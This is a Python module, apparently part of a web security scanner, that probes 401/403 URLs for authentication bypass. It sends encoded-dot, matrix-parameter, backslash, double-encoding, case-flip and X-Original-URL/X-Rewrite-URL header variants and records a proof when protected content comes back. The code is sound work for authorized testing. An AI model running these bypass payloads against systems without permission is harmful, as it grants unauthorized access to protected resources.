"""Path-normalization / URL-parsing authentication-bypass scanner.

For every URL that answers 401/403, replays it through the classic parser-
discrepancy shapes that make front-ends and back-ends disagree about *which*
resource the request actually targets:

  * encoded dots        `/%2e/admin`, `/%252e/admin`
  * dot-segments        `/./admin`, `//admin`, `/a/../admin`
  * matrix parameters   `/admin;.css`, `/admin;/`, `/admin;%2f`
  * backslash           `\\admin`, `/%5cadmin`
  * case flips          `/Admin`, `/ADMIN`
  * trailing slash      `/admin/`
  * double-encode       `/%252fadmin`
  * header rewrites     X-Original-URL / X-Rewrite-URL: /admin

A bypass is only claimed when a variant returns a 2xx that is NOT an auth
wall / login page and carries substantive content — then the captured
response becomes the proof (category `broken_auth`, so the existing
no-session revalidator double-checks it before reporting).
"""
from __future__ import annotations

import asyncio
from typing import TYPE_CHECKING
from urllib.parse import urlparse, urlunparse

from core.poc import is_auth_wall, is_static_asset, proof_record

if TYPE_CHECKING:
    from core.orchestrator import Context

_REWRITE_HEADERS = (
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
    ("X-Forwarded-Path", "/"),
)


def _variants(url: str) -> list[tuple[str, str | None]]:
    """Yield (variant_url, extra_header) pairs for a 401/403 URL."""
    p = urlparse(url)
    path = p.path
    base = p._replace(path="")
    out: list[tuple[str, str | None]] = []
    segs = [s for s in path.split("/") if s != ""]
    if not segs:
        return out
    last = segs[-1]
    # trailing slash / case flips
    out.append((urlunparse(p._replace(path=path + "/")), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + [last.swapcase()]))), None))
    # dot-segment and separator tricks
    out.append((urlunparse(p._replace(path="//" + path.lstrip("/"))), None))
    out.append((urlunparse(p._replace(path="/./" + path.lstrip("/"))), None))
    out.append((urlunparse(p._replace(path="/" + last)), None))
    # encoded separators on the last segment
    for enc in ("%2e", "%252e"):
        out.append((urlunparse(p._replace(path="/".join(segs[:-1] + [enc + last]))), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + [last + "%2f"]))), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + [last + ";"]))), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + [last + ";.css"]))), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + ["..;/" + last]))), None))
    out.append((urlunparse(p._replace(path="/".join(segs[:-1] + ["%5c" + last]))), None))
    # double-encoded full path
    out.append((urlunparse(p._replace(path=path.replace("/", "%252f", 1))), None))
    # header rewrites against the root — the header carries the ORIGINAL path
    for header_name, _root in _REWRITE_HEADERS:
        out.append((urlunparse(base._replace(path="/")), f"{header_name}: {path}"))
    # dedupe
    seen = set()
    uniq = []
    for u, h in out:
        if u in seen:
            continue
        seen.add(u)
        uniq.append((u, h))
    return uniq


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    if method.upper() != "GET":
        return findings
    base_ev = await ctx.http.get(url, allow_redirects=False)
    if base_ev.status not in (401, 403):
        return findings
    base_len = len(base_ev.response_body or "")

    sem = asyncio.Semaphore(8)

    async def probe(variant: str, header: str | None) -> None:
        async with sem:
            ev = await ctx.http.get(variant, headers={header.split(":", 1)[0]: header.split(":", 1)[1].strip()} if header else None,
                                    allow_redirects=False)
        if ev.status not in range(200, 300) or ev.status in (204,):
            return
        body = ev.response_body or ""
        if len(body) < 80 or is_static_asset(variant, ev.response_headers):
            return
        wall, _why = is_auth_wall(ev.status, ev.response_headers, body, variant)
        if wall:
            return
        # the bypass must be meaningfully different from the 403 page
        if abs(len(body) - base_len) < 100 and ev.url.rstrip("/") == url.rstrip("/"):
            return
        poc = proof_record(
            verified=True, method="GET", url=variant,
            request=f"GET {variant}" + (f"\n{header}" if header else ""),
            status=ev.status, excerpt=body,
            rationale=(f"The URL {url} answers {base_ev.status}, but the parser-confusion "
                       f"variant {variant} returned {ev.status} with substantive content — "
                       "the authorization check is bypassable through URL normalization."))
        findings.append({
            "category": "broken_auth",
            "title": f"Authentication bypass via path normalization ({urlparse(url).path})",
            "severity": "high", "cvss": 8.1,
            "url": url, "parameter": "(path normalization)",
            "payload": variant,
            "evidence": f"{url} returns {base_ev.status}, but `{variant}`"
                        + (f" with `{header}`" if header else "")
                        + f" returns {ev.status} ({len(body)}B of non-auth-wall content) — "
                          "URL-parser disagreement lets the request reach protected resources.",
            "request": f"GET {variant}",
            "response": body[:1500],
            "metadata": {"detection": "path_normalization",
                         "variant": variant, "original_status": base_ev.status,
                         "poc": poc},
        })

    await asyncio.gather(*(probe(u, h) for u, h in _variants(url)))
    return findings
